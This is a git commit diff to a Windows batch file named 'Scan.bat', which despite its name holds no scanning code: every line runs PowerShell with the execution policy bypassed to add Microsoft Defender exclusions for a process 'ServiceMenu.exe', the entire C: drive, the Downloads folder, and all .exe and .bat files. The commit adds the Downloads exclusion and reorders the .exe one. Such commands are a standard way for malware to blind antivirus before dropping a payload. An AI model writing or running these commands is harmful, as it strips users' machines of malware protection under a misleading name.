ed8b0a4bc89e448b238c5b593a1f90340217c1ee
Infra0202 <kechichi.abdelhamid@yahoo.com>
2025-02-13 04:59:08 +0300

    Update Scan.bat

--- Scan.bat
+++ Scan.bat
@@ -1,4 +1,5 @@
 PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionProcess 'ServiceMenu.exe'"
 PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath 'C:\'"
-powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension exe
+PowerShell -ExecutionPolicy Bypass -Command "Add-MpPreference -ExclusionPath '%UserProfile%\Downloads'"
 powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension bat
+powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionExtension exe
